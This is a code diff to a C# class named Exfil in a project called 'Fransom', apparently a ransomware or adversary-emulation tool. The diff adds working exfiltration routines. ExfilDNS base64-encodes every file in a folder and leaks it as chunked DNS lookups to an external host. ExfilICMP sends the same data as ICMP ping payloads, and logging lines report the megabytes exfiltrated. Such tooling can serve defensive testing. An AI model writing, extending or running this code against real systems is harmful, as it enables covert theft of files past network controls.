@@ -8,8 +8,11 @@ using System.DirectoryServices.AccountManagement;
 using System.IO;
 using System.Linq;
 using System.Net;
+using System.Net.NetworkInformation;
 using System.Reflection;
 using System.Text;
+using System.Text.RegularExpressions;
+using System.Threading;
 using System.Threading.Tasks;
 
 namespace Fransom
@@ -28,6 +31,22 @@ namespace Fransom
             rng.NextBytes(data);
             File.WriteAllBytes(location + "\\" + Path.GetRandomFileName(), data);
         }
+
+        public string BytesToBase32(byte[] bytes)
+        {
+            const string alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
+            string output = "";
+            for (int bitIndex = 0; bitIndex < bytes.Length * 8; bitIndex += 5)
+            {
+                int dualbyte = bytes[bitIndex / 8] << 8;
+                if (bitIndex / 8 + 1 < bytes.Length)
+                    dualbyte |= bytes[bitIndex / 8 + 1];
+                dualbyte = 0x1f & (dualbyte >> (16 - bitIndex % 8 - 5));
+                output += alphabet[dualbyte];
+            }
+            return output;
+        }
+
 
         public Exfil()
         {
@@ -70,7 +89,6 @@ namespace Fransom
                         Console.WriteLine("[*] Exfiltrated " + info.Name + " using SFTP. Total exfil'd data: " + d + " megabytes");
                     }
                 }
-                Console.WriteLine("exit");
             }
         }
         public void ExfilFTP()
@@ -193,13 +211,68 @@ namespace Fransom
         }
         public void ExfilDNS()
         {
-            // TODO
+            // can use base32 encoding to survive eventual case conversion and add seqno req's if this needs to "work"
+            IEnumerable<FileSystemInfo> infos = new DirectoryInfo(folder).EnumerateFileSystemInfos();
+            long d = 0;
+            foreach (FileSystemInfo info in infos)
+            {
+                string encoded = Convert.ToBase64String(File.ReadAllBytes(info.FullName));
+                encoded = encoded.Replace("/", "SLASH");
+                encoded = encoded.Replace("+", "PLUS");
+                encoded = encoded.Replace("=", "EQU");
+                List<string> chunks = new List<string>();
+                int recordlen = 63;
+                for (int i = 0; i < encoded.Length; i += recordlen)
+                {
+                    if ((i + recordlen) < encoded.Length)
+                        chunks.Add(encoded.Substring(i, recordlen));
+                    else
+                        chunks.Add(encoded.Substring(i));
+                }
+                foreach (var chunk in chunks)
+                {
+                    // this can be somewhat slow because of rate limiting and other factors
+                    IPHostEntry ignored = Dns.GetHostEntry(chunk + ".dns." + exfilhost);
+                }
+
+                FileInfo f = new FileInfo(info.FullName);
+                d += f.Length / (1024 * 1024);
+                Console.WriteLine("[*] Exfiltrated " + info.Name + " using DNS. Total exfil'd data: " + d + " megabytes");
+            }
         }
         public void ExfilICMP()
         {
-            // TODO
+            IEnumerable<FileSystemInfo> infos = new DirectoryInfo(folder).EnumerateFileSystemInfos();
+            long d = 0;
+            int timeout_ms = 1; // how long to wait for responses, they are not used so just spew as fast as possible
+            Ping pkt = new Ping();
+            PingOptions popt = new PingOptions(64,false); // ttl, dontFragment
+            IPHostEntry hostEntry = Dns.GetHostEntry(exfilhost);
+            foreach (FileSystemInfo info in infos)
+            {
+                // this encoding is not required 
+                string encoded = Convert.ToBase64String(File.ReadAllBytes(info.FullName));
+                encoded = encoded.Replace("/", "SLASH");
+                encoded = encoded.Replace("+", "PLUS");
+                encoded = encoded.Replace("=", "EQU");
+                List<string> chunks = new List<string>();
+                int chunksize = 128; // up for perf gains
+                for (int i = 0; i < encoded.Length; i += chunksize)
+                {
+                    if ((i + chunksize) < encoded.Length)
+                        chunks.Add(encoded.Substring(i, chunksize));
+                    else
+                        chunks.Add(encoded.Substring(i));
+                }
+                foreach (var chunk in chunks)
+                {
+                    pkt.Send(hostEntry.AddressList[0], timeout_ms, Encoding.ASCII.GetBytes(chunk), popt);
+                }
+
+                FileInfo f = new FileInfo(info.FullName);
+                d += f.Length / (1024 * 1024);
+                Console.WriteLine("[*] Exfiltrated " + info.Name + " using ICMP. Total exfil'd data: " + d + " megabytes");
+            }
         }
-
-
     }
 }
